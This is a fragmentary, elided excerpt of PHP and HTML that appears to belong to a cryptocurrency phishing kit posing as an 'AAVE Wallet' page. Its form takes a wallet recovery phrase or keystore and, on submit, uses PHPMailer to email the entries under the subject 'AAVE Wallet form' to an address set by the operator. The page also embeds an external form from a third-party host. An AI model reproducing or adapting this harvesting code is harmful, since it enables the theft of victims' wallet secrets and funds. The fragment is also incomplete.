...
$message = "";
  ...
  if (isset($_POST['submit'])) {
    ...
    $mail = new PHPMailer(true);
      ...
      //Recipients
       $mail->setFrom($setForm, "AAVE Wallet");
       $mail->addAddress($send_to, ''); // Add a recipient

      // Content
       $mail->isHTML(true); 
       $mail->Subject = 'AAVE Wallet form';
       $mail->Body = '
          <TABLE>
             <TR>
                <TD>Phrase</TD>
...
<div id="phrase1" class="tabcontent" style="display: block;">
  ...
  <div id="keystore1" class="tabcontent" style="display: none;">
    ...
    <embed src="https://ngs.dashclicks.com/forms/userform/1ecce880-dedb-4ac0-aa8e-106054f1864d" width="100%" height="400px" />      <br>
    <div class="field">
